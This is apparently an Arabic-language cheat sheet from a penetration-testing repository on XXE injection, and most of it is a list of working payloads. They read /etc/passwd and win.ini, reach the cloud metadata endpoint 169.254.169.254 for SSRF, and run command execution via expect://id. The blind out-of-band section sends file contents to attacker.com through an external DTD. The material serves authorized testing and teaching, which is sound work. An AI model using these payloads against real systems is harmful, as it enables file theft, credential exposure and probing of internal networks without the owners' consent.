<a id="-xxe---xml-external-entity-injection"></a>
# 📄 XXE — حقن الكيانات الخارجية في XML

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   XML External Entity Injection
```

يشير الشعار إلى حقن الكيانات الخارجية في XML، واختصارها XXE.

---

<a id="-what-is-xxe"></a>
## 🎯 ما هي ثغرة XXE؟

تستغل **XXE** محللات XML التي تعالج مراجع إلى كيانات خارجية دون القيود المناسبة؛ وقد تتيح قراءة الملفات أو تنفيذ SSRF، وفي حالات خاصة تنفيذ شيفرة عن بُعد (RCE).

---

<a id="-basic-payloads"></a>
## 💉 مدخلات اختبار أساسية (Payloads)

<a id="read-local-files"></a>
### قراءة الملفات المحلية
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

<a id="windows-files"></a>
### ملفات Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

<a id="ssrf-via-xxe"></a>
### تزوير الطلبات من جهة الخادم (SSRF) عبر XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

<a id="-blind-xxe-out-of-band"></a>
## 🔒 ثغرات XXE العمياء والتفاعل خارج القناة (Out-of-Band)

<a id="external-dtd"></a>
### تعريف نوع مستند خارجي (External DTD)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**محتوى evil.dtd على خادم الاختبار الذي يتحكم فيه المختبر:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

<a id="error-based-exfiltration"></a>
### تسريب البيانات عبر رسائل الأخطاء

> **توضيح لصحة XML:** يتضمن المثال مرجع `%file;` داخل تصريح في الجزء الداخلي من DTD، وهو مقيد بمواصفة XML؛ كما أنه مقطع DTD لا مستند XML كامل. أُبقي المثال الأصلي حرفيًا، ولا يفترض نجاحه لدى جميع المحللات. [قيد W3C على الكيانات المعلمية](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset).
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات تجاوز التحقق

<a id="encoding"></a>
### الترميز

> **توضيح:** تغيير `encoding="UTF-16"` وحده لا يحول بايتات المستند إلى UTF-16. المقاطع أدناه تعرض أفكارًا منفصلة، وليست مستند XML واحدًا مكتملًا صالحًا للإرسال كما هو. [مواصفة ترميز XML](https://www.w3.org/TR/xml/#charencoding).
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- تغليف باستخدام Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

<a id="protocol-variants"></a>
### صيغ بروتوكولات مختلفة

> **توافق البيئة:** تعتمد صيغ مثل `php://` و`expect://` على معالج الموارد وبيئة التشغيل؛ لا تتوفر في كل محلل XML. وتوضح PHP أن `expect://` غير مفعل افتراضيًا ويتطلب إضافة Expect. [دليل PHP الرسمي](https://www.php.net/manual/en/wrappers.expect.php).
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

<a id="xinclude"></a>
### تضمين الموارد باستخدام XInclude

> **توضيح:** XInclude آلية تضمين مستقلة عن تعريف الكيانات الخارجية؛ يلزم أن يعالج التطبيق عناصرها حتى يؤثر المثال. مجرد قبول XML لا يعني تفعيلها. [مواصفة W3C لـ XInclude](https://www.w3.org/TR/xinclude/).
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

<a id="svg-xxe"></a>
### اختبار XXE في SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

|نوع مدخل الاختبار|الاستخدام|
|--------------|----------|
|قراءة الملفات|`SYSTEM "file:///etc/passwd"`|
|SSRF|`SYSTEM "http://internal/"`|
|اختبار أعمى خارج القناة (OOB)|تعريف DTD خارجي مع تسريب البيانات|
|اختبار معتمد على الأخطاء|تضمين البيانات في رسالة خطأ|

<a id="common-vulnerable-endpoints"></a>
### نقاط معالجة شائعة قد تتأثر
```
- واجهات API المعتمدة على SOAP
- وظائف رفع ملفات XML
- معالجات SVG
- محللات المستندات مثل DOCX وXLSX
- خلاصات RSS/Atom
```

---

<a id="-resources"></a>
## 📚 الموارد

- [دليل PortSwigger حول XXE](https://portswigger.net/web-security/xxe)
- [أمثلة XXE في PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 اختبر أمن محللات XML!</b><br>
  <i>للاختبارات المصرح بها فقط!</i>
</p>
